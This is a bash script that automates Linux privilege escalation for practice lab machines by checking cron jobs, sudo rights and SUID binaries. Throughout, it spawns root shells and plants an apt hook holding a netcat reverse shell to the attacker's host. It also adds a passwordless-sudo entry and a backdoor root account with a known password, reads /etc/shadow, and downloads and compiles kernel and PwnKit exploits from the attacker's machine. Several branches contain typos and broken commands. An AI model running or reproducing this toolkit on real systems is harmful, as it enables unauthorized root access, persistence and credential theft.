#!/bin/bash

#As I do different boxes this will continue to be updated...
#Many of the exploits came from doing boxes on Proving Grounds Play and Practice
#Built by OvergrownCarrot1 Thanks for using
#If there is a problem with one please hit me up on discord and let me know what happened, I know that some do not work as they are supposed to and I have been working on them to make them work appropriately

#Script only looks at /usr/bin, yes you may have to manually exploit something...

#stopped on gimp

now=$(date)
i=$(whoami)
d=$(id)
b=$(/usr/bin/)

cd /tmp

if [ "$(id -u)" = "0" ]; then
   echo "You are already root, how much more could you want" 1>&2
   exit 1
else
	echo ""
fi

echo -e '\E[31;40m' "Script is not an end all be all, you may actually need to do some manual enumeration and exploitation"; tput sgr0
echo -e '\E[32;40m' "Make sure linpeas is in the folder you have your web server on and is called linpeas.sh (ex: python3 -m http.server 8080)"; tput sgr0
echo -e '\E[31;40m' "Segmentation fault or critical error is ok... let the script continue running"; tput sgr0
sleep 2
echo -e '\E[31;40m' "LHOST"; tput sgr0
read LHOST
echo -e '\E[31;40m' "Web server LPORT"; tput sgr0
read LPORT
echo -e '\E[32;40m' "Before Downloading linpeas looking for easy wins"; tput sgr0
echo "Current user is $i within group $d" > info.txt
echo "Script last ran on $now" >> info.txt
echo -e '\E[31;40m' "Looking at cronjobs and saving in info.txt"; tput sgr0
cat /etc/crontab >> info.txt
cat /etc/crontab
if grep "apt-get" info.txt; then
	ls -la /etc/apt | grep apt.conf.d
	read -p "Is file writeable by user? (y/n)" answer
	if [ $answer = y ]; then
		echo -e '\E[31;40m' "If this does not work you can follow writeup here https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/"
		cd /etc/apt/apt.conf.d
		echo -e '\E[31;40m' "What port do you want to make a reverse shell on (LPORT)?";tput sgr0
		read LPORT1
		echo -e '\E[32;40m' "Putting file named pwn into /etc/apt/apt.conf.d"
		echo -e "apt::Update::Pre-Invoke" "{\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT1 >/tmp/f\"};" > pwn
		echo -e '\E[31;40m' "Wait for reverse shell on $LHOST port $LPORT1 (remember will take as long as cronjob takes to run)"; tput sgr0
		cat /etc/apt/apt.conf.d/pwn
		cd /tmp
	else
		echo -e '\E[31;40m' "Exploit should not work, can try manually if you would like"; tput sgr0
		echo -e '\E[32;40m' "If trying manually here you go https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/"
	fi
fi

echo -e '\E[31;40m' "Looking at sudo rights"; tput sgr0
echo -e '\E[31;40m' "Ran SUDO with user $i on $now" > /tmp/sudo.txt; tput sgr0
sudo -l >> /tmp/sudo.txt
read -p "Would you like to try and auto exploit any SUDO rights? (y/n):" answer
if [ $answer = n ]; then
	echo -e '\E[31;40m' "Not trying to exploit anything, you can see SUDO rights in /tmp/sudo.txt"; tput sgr0
else
	if egrep 'awk|find|ftp|python3|python' sudo.txt; then
		echo -e '\E[31;40m' "Found something and trying to exploit"; tput sgr0
		if grep -w $b"awk" sudo.txt; then
			sudo awk 'BEGIN {system("/bin/sh")}'
		elif grep -w $b"find" sudo.txt; then
			sudo find . -exec /bin/sh -p \; -quit
		elif grep -w $b"ftp" sudo.txt; then
			echo -e '\E[31;40m' "Run the following command in FTP !/bin/sh"; tput sgr0
			sudo ftp
			!/bin/sh
		elif grep -w $b"python3" sudo.txt; then
			sudo python3 -c 'import os; os.system("/bin/sh")'
		elif grep -w $b"python" sudo.txt; then
			sudo python -c 'import os; os.system("/bin/sh")'
		fi
	fi
fi

echo -e '\E[31;40m' "Looking at SUID Bits"; tput sgr0
echo -e '\E[31;40m' "Ran SUID bits with user $i on $now" > /tmp/suid.txt; tput sgr0
find / -perm -u=s -type f 2>/dev/null >> /tmp/suid.txt
grep -i $b"*" /tmp/suid.txt > /tmp/suid1.txt
rm -rf /tmp/suid.txt
mv /tmp/suid1.txt /tmp/suid.txt
cat /tmp/suid.txt
echo -e '\E[31;40m' "Saved SUID Bits to suid.txt"; tput sgr0
read -p "Would you like to try and auto exploit any SUID bits? (y/n):" answer
if [ $answer = n ]; then
	echo -e '\E[31;40m' "Not trying to exploit anything, you can see SUID bits in /tmp/suid.txt"
else
	if egrep 'find|bash|busybox|chmod|chroot|wget|vim|systemctl|agetty|cabal|capsh|choom|chown|chroot|dash|emacs|env|dmsetup|docker|expect|fish|flock|gcore|gdb|genie|gimp|cp' suid.txt; then
		echo -e '\E[31;40m' "Found something and trying to exploit"; tput sgr0
		if grep $b"find" suid.txt; then
			/usr/bin/find . -exec /bin/bash -p \; -quit
		elif grep -w $b"gimp" suid.txt; then
			/usr/bin/gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl("/bin/sh", "sh", "-p")'
		elif grep $b"gcore" suid.txt; then
			ss
			read -p "PID number to move into?" answer
			PID=$answer
			/usr/bin/gcore $PID
		elif greo $b"genie" suid.txt; then
			/usr/bin/genie -c '/bin/sh'
		elif grep $b"gdb" suid.txt; then
			/usr/bin/gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
		elif grep $b"fish" suid.txt; then
			/usr/bin/fish
		elif grep $b"flock" suid.txt; then
			/usr/bin/flock -u / /bin/sh -p
		elif grep $b"bash" suid.txt; then
			/usr/bin/bash -p
		elif grep "busybox" suid.txt; then
			/usr/bin/busybox sh
		elif grep $b"chmod" suid.txt ; then
			cd /usr/bin
			LFILE=/etc/passwd
			./chmod 6777 $LFILE
			echo "User root2 added to /etc/passwd with password toor"
			echo "root2:`openssl passwd toor`:0:0:root:/root:/bin/bash" >> /etc/passwd
			LFILE=/etc/shadow
			./chmod 6777 $LFILE
			echo "User root2 added to /etc/shadow with password toor"
			echo "root2:`openssl passwd toor`:0:0:root:/root:/bin/bash" >> /etc/passwd
			echo '\E[31;40m' "Both passwd and shadow are now writeable, feel free to do what you will with it"; tput sgr0
		elif grep "cpulimit" suid.txt ; then
			/usr/bin/cpulimit -l 100 -f -- /bin/sh -p
			/usr/sbin/cpulimit -l 100 -f -- /bin/sh -p
		elif grep "chroot" suid.txt; then
			/usr/bin/chroot / /bin/sh -p
			/usr/sbin/chroot / /bin/sh -p
		elif grep $b"wget" suid.txt; then
			TF=$(mktemp)
			chmod +x $TF
			echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
			./wget --use-askpass=$TF 0
		elif grep $b"vim"; then
			/usr/bin/vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
		elif grep "unzip"; then
			cd /usr/bin
			./unzip -K shell.zip
			./sh -p
		elif grep "systemctl" suid.txt; then
			TF=$(mktemp).service
			echo '[Service]
			Type=oneshot
			ExecStart=/bin/sh -c "id > /tmp/output"
			[Install]
			WantedBy=multi-user.target' > $TF
			/usr/bin/systemctl link $TF
			/usr/bin/systemctl enable --now $TF
		elif grep "agetty" suid.txt; then
			/usr/bin/agetty -o -p -l /bin/sh -a root tty
		elif grep "cabal" suid.txt; then
			/usr/bin/cabal exec -- /bin/sh -p
		elif grep "capsh" suid.txt; then
			/usr/bin/capsh --gid=0 --uid=0 --
		elif grep "choom" suid.txt; then
			/usr/bin/choom -n 0 -- /bin/sh -p
		elif grep "chown" suid.txt; then
			LFILE=/etc/passwd
			/usr/bin/chown $(id -un):$(id -gn) $LFILE
			echo "User root2 added to /etc/passwd with password toor"
			echo "root2:`openssl passwd toor`:0:0:root:/root:/bin/bash" >> /etc/passwd
			LFILE=/etc/shadow
			/usr/bin/chown $(id -un):$(id -gn) $LFILE
			echo "User root2 added to /etc/shadow with password toor"
			echo "root2:`openssl passwd toor`:0:0:root:/root:/bin/bash" >> /etc/passwd
			echo '\E[31;40m' "Both passwd and shadow are now writeable, feel free to do what you will with it"; tput sgr0
			cat /etc/passwd | grep -i root2
			cat /etc/shadow | grep -i root2
		elif grep "chroot" suid.txt; then
			/usr/bin/chroot / /bin/sh -p
		elif grep $b"cp" suid.txt; then
			echo '\E[31;40m' "Going through a few different things, cp has a lot"
			LFILE=/etc/passwd
			echo "root2:\`openssl passwd toor\`:0:0:root:/root:/bin/bash" | ./cp /dev/stdin "$LFILE"
			echo -e '\E[31;40m' "User root2 added to /etc/passwd with password toor"
			LFILE=/etc/shadow
			echo "root2:\`openssl passwd toor\`:0:0:root:/root:/bin/bash" | ./cp /dev/stdin "$LFILE"
			echo -e '\E[31;40m' "User root2 added to /etc/shadow with password toor"
			echo -e '\E[32;40m' "Trying another way incase that didn't work"
			TF=$(mktemp)
			echo "root2:\`openssl passwd toor\`:0:0:root:/root:/bin/bash" > $TF
			/usr/bin/cp $TF $LFILE
			LFILE=/etc/passwd
			/usr/bin/cp $TF $LFILE
			LFILE=/etc/shadow
			/usr/bin/cp $TF $LFILE
			echo -e '\E[31;40m' "User root2 added to /etc/shadow and /etc/passwd with password toor"
			/usr/bin/cp --attributes-only --preserve=all ./cp "$LFILE"
			LFILE=/etc/passwd
			/usr/bin/cp --attributes-only --preserve=all ./cp "$LFILE"
			echo -e '\E[31;40m' "Should have suid permissions on both /etc/passwd and /etc/shadow"
			echo -e '\E[31;40m' "Doing one last thing, making suid permissions on find and seeing if we can get root like that"
			LFILE=/usr/bin/find
			/usr/bin/cp --attributes-only --preserve=all ./cp "$LFILE"
			/usr/bin/find . -exec /bin/bash -p \; -quit
			cat /etc/passwd | grep -i root2
			cat /etc/shadow | grep -i root2
		elif grep "dash" suid.txt; then
			/usr/bin/dash -p
		elif grep "emacs" suid.txt; then
			/usr/bin/emacs -Q -nw --eval '(term "/bin/sh -p")'
		elif grep $b"env" suid.txt; then
			/usr/bin/env /bin/sh -p
		elif grep "dmsetup" suid.txt; then
			/usr/bin/dmsetup "create base <<EOF
			0 3534848 linear /dev/loop0 94208
			EOF
			./dmsetup ls --exec /bin/sh -p -s'"
		elif grep $b"docker" suid.txt; then
			read -p "Docker type (ex: alpine):" answer
			/usr/bin/docker run -v /:/mnt --rm -it $answer chroot /mnt sh
		elif grep -w $b"expect" suid.txt; then
			/usr/bin/expect -c 'spawn /bin/sh -p;interact'
		else
		echo -e '\E[31;40m' "Nothing to automatically exploit at this time by $i on $now withing group $d"
		fi
	fi
fi

####################################################################################################################
	read -p "Look for SUID Bits that can read other files (ex: /etc/shadow)? (y/n):" answer
if [ $answer = n ]; then
	echo -e '\E[31;40m' "Not looking for files that will allow us to read other files"
else
	echo -e '\E[31;40m' "Looking for files that will allow us to read another file (ex: /etc/shadow)"; tput sgr0
	if egrep 'base|cat|alpine|ascii-xfr|ash|aspell|atobm|awk|bridge|bzip2|cmp|column|comm|csplit|csvtool|cupsfilter|curl|cut|date|genisoimage|debugfs|dialog|diff|dig|dosbox|expand|efax|espeak|arp|eqn|fmt|gawk|ar|ed|dd|bc|as' suid.txt; then
		if grep -w $b"expand" suid.txt; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/expand "$LFILE"
		elif grep "genisoimage" suid.txt; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/genisoimage -sort "$LFILE"
		elif grep -w $b"gawn" suid.txt; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/gawk '//' "$LFILE"
		elif grep -w $b"fold" suid.txt; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/fold -w99999999 "$LFILE"
		elif grep -w $b"fmt" suid.txt; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/fmt -999 "$LFILE"
		elif grep -w $b"file" suid.txt; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/file -f $LFILE	 
		elif grep -w $b"eqn" suid.txt; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/eqn "$LFILE"
		elif grep "espeak" suid.txt; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/espeak -qXf "$LFILE"
		elif grep -w $b"awk" suid.txt; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer 
			/usr/bin/awk '//' "$LFILE"
		elif grep -w $b"base32" suid.txt ; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/base32 "$LFILE" | base32 --decode
		elif grep -w $b"base64" suid.txt ; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/base64 "$LFILE" | base64 --decode
		elif grep -w $b"basenc" suid.txt ; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/basenc --base64 $LFILE | basenc -d --base64
		elif grep -w $b"cat" suid.txt; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/cat "$LFILE"
		elif grep -w "alpine" suid.txt; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/alpine -F "$LFILE"
		elif grep -w $b"as" suid.txt; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/as @$LFILE
		elif grep -w "ascii-xfr" suid.txt; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/ascii-xfr -ns "$LFILE"
		elif grep -w $b"ash" suid.txt; then
			/usr/bin/ash
		elif grep -w "aspell" suid.txt; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/aspell -c "$LFILE"
		elif grep -w "atobm" suid.txt; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/atobm $LFILE 2>&1 | awk -F "'" '{printf "%s", $2}'
		elif grep -w $b"awk" suid.txt; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/awk '//' "$LFILE"
			echo -e '\E[31;40m' "May be able to get a shell with limited SUID by using command ./awk 'BEGIN {system(\"/bin/sh\")}'"; tput sgr0
		elif grep -w "basez" suid.txt;  then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/basez "$LFILE" | basez --decode
		elif grep -w $b"bc" suid.txt; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/bc -s $LFILE
			quit
		elif grep -w "bridge" suid.txt; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/bridge -b "$LFILE"
		elif grep -w "bzip2" suid.txt; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/bzip2 -c $LFILE | bzip2 -d
		elif grep -w "cmp" suid.txt; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/cmp $LFILE /dev/zero -b -l
		elif grep -w "column" suid.txt; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/column $LFILE
		elif grep -w "comm" suid.txt; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/comm $LFILE /dev/null 2>/dev/null
		elif grep -w "csplit" suid.txt; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/csplit $LFILE 1
			cat xx01
		elif grep -w "csvtool" suid.txt; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/csvtool trim t $LFILE
		elif grep -w "cupsfilter" suid.txt; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/cupsfilter -i application/octet-stream -m application/octet-stream $LFILE
		elif grep -w $b"curl" suid.txt; then
			read -p "File to get from attacker machine (ex: shell.elf):" answer
			URL=http://$LHOST:$LPORT/$answer
			LFILE=$answer
			/usr/bin/curl /usr/binRL -o /tmp/$LFILE
		elif grep -w "cut" suid.txt; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/cut -d "" -f1 "$LFILE"
		elif grep -w $b"date" suid.txt; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/date -f $LFILE
		elif grep -w $b"dd" suid.txt; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			echo "data" | /usr/bin/dd of=$LFILE
		elif grep -w "debugfs" suid.txt; then
			/usr/bin/debugfs
			\!/bin/sh
		elif grep -w "dialog" suid.txt; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/dialog --textbox "$LFILE" 0 0
		elif grep -w -w $b"diff" suid.txt; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/diff --line-format=%L /dev/null $LFILE
		elif grep -w -w $b"dig" suid.txt; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/dig -f $LFILE
		elif grep -w "dosbox" suid.txt; then
			LFILE=/etc/passwd
			echo -e '\E[31;40m' "Putting user root2:toor into /etc/passwd and /etc/shadow"
			/usr/bin/dosbox -c 'mount c /' -c "echo root2:\`openssl passwd toor\`:0:0:root:/root:/bin/bash >c:$LFILE" -c exit
			LFILE=/etc/shadow
			/usr/bin/dosbox -c 'mount c /' -c "echo root2:\`openssl passwd toor\`:0:0:root:/root:/bin/bash >c:$LFILE" -c exit
			cat /etc/passwd | grep -i root2
			cat /etc/shadow | grep -i root2
			echo -e '\E[31;40m' "Sometimes dosbox likes to add a M^ at the end of a file, also updating sudo permissions to run sudo with no password"
			whoami
			echo -e '\E[32;40m' "Current user?"
			read LUSER
			LFILE=/etc/sudoers
			/usr/bin/dosbox -c 'mount c /' -c "echo $LUSER ALL=(ALL) NOPASSWD:ALL >c:$LFILE" -c exit
			sudo su
		elif grep -w $b"ed" suid.txt; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/ed file_to_read
			,p
			q
		elif grep -w "efax" suid.txt; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/efax -d "$LFILE"
#KEEP ARP AT THE BOTTOM OF FILE
		elif grep -w $b"arp" suid.txt; then
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/arp -v -f "$LFILE"
		elif grep -w $b"ar" suid.txt; then
			TF=$(mktemp -u)
			read -p "What file would you like to view (ex: /etc/shadow):" answer
			LFILE=$answer
			/usr/bin/ar r "$TF" "$LFILE"
			cat "$TF"
		else
			echo -e '\E[32;40m' "Found nothing to exploit"
		fi
	fi
fi
find /etc -writable -ls 2>/dev/null > write.txt
if grep -w "/etc/fail2ban" write.txt; then
	ls -la /etc/fail2ban | grep action.d
	read -p "Do you have write permissions over folder action.d (y/n):" answer
	if [ $answer = "y" ]; then
		cd /etc/fail2ban
		echo -e '\E[32;40m' "Walkthrough can be found here https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49"
		sleep 2
		echo -e '\E[31;40m' "Checking jail.conf"
		cat /etc/fail2ban/jail.conf
		cd action.d
		echo -e '\E[32;40m' "Take note of maxretry"
		read -p "Hit enter to continue after looking at maxretry" answer
		echo -e '\E[31;40m' "Renaming iptables-multiport.conf to iptables-multiport.conf.bak"
		mv  iptables-multiport.conf iptables-multiport.conf.bak
		echo -e '\E[31;40m' "Remaking iptables-multiport.conf so you have permissions to it"
		cp iptables-multiport.conf.bak iptables-multiport.conf
		chmod 666 iptables-multiport.conf
		echo -e '\E[31;40m' "Now you need to open iptables-multiport.conf and put a reverse shell in the actionban location (ex: actionban= /usr/bin/nc -e /usr/bin/bash $LHOST $LPORT)"
		sleep 5
		echo -e '\E[32;40m' "After this has been accomplished make sure you start up a listener on your kali machine and fail to login through, this is where maxretry comes into play (ex: if maxretry is 5 you need to fail to login 5 times):"
		sleep 5
		echo -e '\E[31;40m' "Once you have failed to login so many time, you will get a call back from the machine and should be root"
		sleep 5
	else
		echo -e '\E[31;40m' "Not exploitable with fail2ban exploit, if you want to try manually https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49"
	fi
	exit 1
fi
if grep LEGEND lin.txt
then
	echo -e '\E[31;40m' "lin.txt already exists not running linpeas"; tput sgr0
else
	read -p "Press enter when web server (python3 -m http.server $LPORT) is started on kali machine:" 
	cd /tmp
	wget http://$LHOST:$LPORT/linpeas.sh
	echo -e '\E[31;40m' "Running linpeas and saving to lin.txt this may take a few minutes";tput sgr0
	echo -e '\E[31;40m' "Running linpeas with user $i on $now"; tput sgr0
	echo -e '\E[32;40m' "Linpeas is saving to file lin.txt and is not frozen, do not cancel"; tput sgr0
	bash linpeas.sh > lin.txt
fi
if grep CVE-2021-4034 lin.txt
then
	echo -e '\E[31;40m' "Vulnerable to Sudo exploit CVE-2021-4034";tput sgr0
	echo -e '\E[31;40m' "Found vulnerability with user $i on $now"; tput sgr0
	read -p "Would you like to exploit this vulnerability (y/n):" answer
	if [ $answer = n ] ; then
		echo -e '\E[31;40m' "Not exploiting";tput sgr0
	elif [ $answer = y ] ; then
		echo -e '\E[32;40m' "Trying to download exploit from user machine" ;tput sgr0
		which python3
		if [ $? == 0 ]; then
			echo -e '\E[32;40m' "Python3 is on the machine, utilizing CVE-2021-4034.py"
			echo -e '\E[31;40m' "Do a 'https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py' to local kali machine and make sure python server is still running" ;tput sgr0
			read -p "Press enter when exploit is downloaded and python server is ready on $LPORT"
			wget http://$LHOST:$LPORT/CVE-2021-4034.py
			python3 CVE-2021-4034.py
		elif [ $? != 0 ]; then
			which gcc
			if [ $? == 0 ]; then
				echo -e '\E[32;40m' "GCC is on the machine, trying to exploit with CVE-2021-4034.c"; tput sgr0
				echo -e '\E[31;40m' "Do a 'https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c' to local kali machine and make sure python server is still running" ;tput sgr0
				read -p "Press enter when exploit is downloaded and python server is ready on $LPORT"
				gcc cve-2021-4034-poc.c -o cve-2021-4034-poc
				./cve-2021-4034-poc
			else
				echo -e '\E[31;40m' "Python3 nor GCC exists cannot exploit at this time"; tput sgr0
			fi
		else
			echo -e '\E[31;40m' "Continuing Script";tput sgr0
		fi
	fi
fi

if grep overlayfs lin.txt
then
	echo -e '\E[31;40m' "Most likely vulnerable to Overlayfs"; tput sgr0
	echo -e '\E[31;40m' "Found vulnerability with user $i on $now"
	read -p "Would you like to exploit this vulnerability (y/n):" answer
	if [ $answer = n ] ; then
		echo -e '\E[31;40m' "Not exploiting";tput sgr0
	elif [ $answer = y ] ; then
		echo "Trying to exploit"
		if grep 'kernel:3.13.0' lin.txt
		then
			echo -e '\E[31;40m' "Do a searchsploit -m linux/local/37292.c on kali machine and make sure python server is still running" ;tput sgr0
			read -p "Press enter when exploit is downloaded and python server is ready" 
			wget http://$LHOST:$LPORT/37292.c
			gcc 37292.c -o 37292
			./37292
		else 
			echo -e '\E[31;40m' "Do a 'searchsploit -m linux/local/39166.c' on kali machine and make sure python server is still running" ;tput sgr0
			read -p "Press enter when exploit is downloaded and python server is ready on $LPORT" 
			wget http://$LHOST:$LPORT/39166.c
			gcc 39166.c -o 39166
			./39166
		fi
	fi
fi
